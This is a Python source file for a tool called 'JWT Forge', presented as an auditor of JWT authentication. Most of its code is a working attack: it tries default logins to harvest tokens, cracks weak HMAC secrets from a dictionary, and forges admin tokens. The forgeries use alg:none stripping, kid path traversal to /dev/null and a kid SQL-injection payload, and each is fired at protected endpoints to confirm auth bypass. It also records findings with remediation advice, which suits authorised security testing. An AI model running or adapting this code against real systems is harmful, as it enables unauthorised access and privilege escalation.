#!/usr/bin/env python3
"""
jwt_forge.py — Cryptographic JWT & Token Forgery Auditor.

Audits JWT authentication implementations for:
  1. `alg: none` signature-stripping bypass (none / None / NONE / nOnE)
  2. Weak HMAC (HS256/HS384/HS512) secret cracking + live admin token forgery
  3. `kid` (Key ID) header directory-traversal (/dev/null empty-key signing) & SQLi
  4. Embedded `jwk` / `jku` header spoofing acceptance
  5. Missing expiration (`exp`) and privilege-escalation claim tampering
"""
import argparse
import base64
import hashlib
import hmac
import json
import os
import re
import sys
import urllib.parse

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from vibe_core import VibeTool

WEAK_SECRETS = (
    "secret",
    "jwt_secret",
    "jwt-secret",
    "password",
    "123456",
    "12345678",
    "admin",
    "changeme",
    "default",
    "development",
    "dev",
    "test",
    "supersecret",
    "mysecret",
    "private",
    "key",
    "secretkey",
    "secret_key",
    "app_secret",
    "token_secret",
    "novachat",
    "vibe",
    "",
)

CANDIDATE_PROTECTED_PATHS = (
    "/api/admin",
    "/admin",
    "/api/profile",
    "/api/v1/admin",
    "/api/settings",
)


def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def _b64url_decode(seg: str) -> bytes:
    padding = "=" * (-len(seg) % 4)
    return base64.urlsafe_b64decode(seg + padding)


def _forge_jwt(header: dict, payload: dict, secret: bytes = b"", alg_mode: str = "hs256") -> str:
    h_b64 = _b64url_encode(json.dumps(header, separators=(",", ":")).encode("utf-8"))
    p_b64 = _b64url_encode(json.dumps(payload, separators=(",", ":")).encode("utf-8"))
    signing_input = f"{h_b64}.{p_b64}".encode("ascii")
    if alg_mode == "none":
        return f"{h_b64}.{p_b64}."
    sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return f"{h_b64}.{p_b64}.{_b64url_encode(sig)}"


class JwtForge(VibeTool):
    def __init__(self):
        super().__init__("JWT Forge", "Cryptographic JWT & Token Forgery Auditor")

    @staticmethod
    def _parse_jwt(token):
        try:
            parts = token.strip().split(".")
            if len(parts) != 3:
                return None, None, None
            header = json.loads(_b64url_decode(parts[0]))
            payload = json.loads(_b64url_decode(parts[1]))
            return header, payload, parts[2]
        except Exception:
            return None, None, None

    def _crack_secret(self, token):
        parts = token.strip().split(".")
        if len(parts) != 3:
            return None
        header, _, sig = self._parse_jwt(token)
        if not header:
            return None
        alg = str(header.get("alg", "HS256")).upper()
        digest_mod = {
            "HS256": hashlib.sha256,
            "HS384": hashlib.sha384,
            "HS512": hashlib.sha512,
        }.get(alg)
        if not digest_mod:
            return None

        signing_input = f"{parts[0]}.{parts[1]}".encode("ascii")
        for secret in WEAK_SECRETS:
            mac = hmac.new(secret.encode("utf-8"), signing_input, digest_mod).digest()
            if hmac.compare_digest(_b64url_encode(mac), sig):
                return secret
        return None

    def _harvest_token(self, base_url):
        """Try to harvest a sample JWT from shared surface or common login endpoints."""
        surface = self.get_surface()
        tokens = surface.get("jwt_tokens", [])
        if tokens:
            return tokens[0]

        login_url = f"{base_url.rstrip('/')}/api/login"
        for creds in (
            {"username": "alice", "password": "Sunshine1"},
            {"username": "admin", "password": "admin"},
            {"email": "admin@localhost", "password": "admin"},
        ):
            status, body, headers = self.safe_request(login_url, method="POST", data=creds, timeout=5)
            for candidate_source in (body or "", str(dict(headers))):
                m = re.search(r"\beyJ[A-Za-z0-9_-]{8,}\.eyJ[A-Za-z0-9_-]{8,}\.[A-Za-z0-9_-]*", candidate_source)
                if m:
                    tok = m.group(0)
                    self.update_surface(jwt_tokens=[tok])
                    return tok
        return ""

    def _find_protected_endpoint(self, url):
        """Find an endpoint that enforces an auth boundary (401/403) to test forged tokens against."""
        status, _, _ = self.safe_request(url, headers={}, timeout=5)
        if status in (401, 403):
            return url, status

        parsed = urllib.parse.urlparse(url)
        base = f"{parsed.scheme}://{parsed.netloc}"
        for path in CANDIDATE_PROTECTED_PATHS:
            candidate = base + path
            st, _, _ = self.safe_request(candidate, headers={}, timeout=5)
            if st in (401, 403):
                self.log(f"Discovered protected auth boundary at {candidate} (HTTP {st})", "info")
                return candidate, st
        return url, status

    def run(self, url, token=""):
        self.banner()
        self.log(f"Starting JWT cryptographic audit on: {url}")

        parsed = urllib.parse.urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}"

        sample_token = token or self._harvest_token(base_url)
        cracked_secret = None
        base_payload = {"sub": 1, "id": 1, "username": "admin", "role": "admin", "admin": True}

        if sample_token:
            hdr, pay, _ = self._parse_jwt(sample_token)
            if hdr and pay:
                self.log(f"Captured JWT sample (alg={hdr.get('alg')}) claims={list(pay.keys())}", "info")
                base_payload = dict(pay)
                base_payload["role"] = "admin"
                if "exp" not in pay:
                    self.log("JWT sample lacks 'exp' (expiration) claim — tokens never expire", "warn")
                cracked_secret = self._crack_secret(sample_token)
                if cracked_secret is not None:
                    self.log(
                        f"CRACKED JWT HMAC SECRET: '{cracked_secret}' — offline signature verification succeeded!",
                        "crit",
                    )
                    self.record_finding(
                        title=f"Weak JWT HMAC Signing Secret ('{cracked_secret}')",
                        severity="critical",
                        location=url,
                        evidence=f"HMAC signature verified against dictionary secret '{cracked_secret}'.",
                        recommendation="Use a cryptographically random 256-bit+ secret or asymmetric RS256/EdDSA keys.",
                        cwe="CWE-326",
                        owasp="A02:2021-Cryptographic Failures",
                    )

        target_ep, baseline_status = self._find_protected_endpoint(url)
        if baseline_status == 0:
            self.log(f"Target unreachable: {target_ep}", "fail")
            return 2

        if baseline_status not in (401, 403):
            self.log(
                f"Baseline on {target_ep} is HTTP {baseline_status} (not 401/403). "
                "Point --url at a protected endpoint (e.g. /api/admin) to confirm live bypass.",
                "info",
            )

        # Craft forgery vectors
        vectors = []
        for alg_variant in ("none", "None", "NONE"):
            vectors.append((
                f"alg:{alg_variant} signature strip",
                _forge_jwt({"alg": alg_variant, "typ": "JWT"}, base_payload, alg_mode="none"),
                "CWE-347",
            ))

        secrets_to_try = [cracked_secret] if cracked_secret is not None else ["secret", "jwt_secret", "admin", "password"]
        for sec in secrets_to_try:
            if sec is not None:
                vectors.append((
                    f"HS256 admin forge (secret='{sec}')",
                    _forge_jwt({"alg": "HS256", "typ": "JWT"}, base_payload, secret=sec.encode("utf-8")),
                    "CWE-326",
                ))

        vectors.append((
            "kid path-traversal (/dev/null empty key)",
            _forge_jwt(
                {"alg": "HS256", "typ": "JWT", "kid": "../../../../../../dev/null"},
                base_payload,
                secret=b"",
            ),
            "CWE-22",
        ))

        vectors.append((
            "kid SQL-injection bypass",
            _forge_jwt(
                {"alg": "HS256", "typ": "JWT", "kid": "x' UNION SELECT 'secret'--"},
                base_payload,
                secret=b"secret",
            ),
            "CWE-89",
        ))

        bypasses = 0
        for label, forged_token, cwe_id in vectors:
            st, body, _ = self.safe_request(
                target_ep,
                headers={"Authorization": f"Bearer {forged_token}"},
                timeout=6,
            )
            if baseline_status in (401, 403) and st == 200:
                self.log(
                    f"CONFIRMED JWT BYPASS [{label}] on {target_ep} ({baseline_status} -> 200 OK)",
                    "crit",
                )
                self.record_finding(
                    title=f"JWT Authentication Bypass via {label}",
                    severity="critical",
                    location=target_ep,
                    evidence=f"Forged Bearer token flipped HTTP {baseline_status} to 200 OK. Response preview: {(body or '')[:140]}",
                    recommendation="Explicitly whitelist allowed JWT algorithms (reject 'none'), use a strong 256-bit secret, and validate kid against a strict allowlist.",
                    cwe=cwe_id,
                    owasp="A07:2021-Identification and Authentication Failures",
                )
                bypasses += 1
            elif st in (401, 403):
                self.log(f"Rejected ({st}): {label}", "pass")
            else:
                self.log(f"Status {st} on {label}", "info")

        self.log("=" * 32)
        if bypasses > 0 or cracked_secret is not None:
            self.log(
                f"JWT audit complete — {bypasses} live auth bypass(es), weak_secret={'YES' if cracked_secret is not None else 'NO'}",
                "crit",
            )
        else:
            self.log("JWT implementation resisted alg:none, weak-secret, and kid forgery probes", "pass")
        return 0


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="JWT Forge - Cryptographic JWT & Token Forgery Auditor")
    parser.add_argument("--url", required=True, help="Target URL or protected endpoint (e.g. http://localhost:3456/api/admin)")
    parser.add_argument("--token", default="", help="Optional captured JWT token to crack and mutate")
    parser.add_argument("-v", "--version", action="version", version="JWT Forge 1.0.0")
    args = parser.parse_args()

    sys.exit(JwtForge().run(args.url, token=args.token))
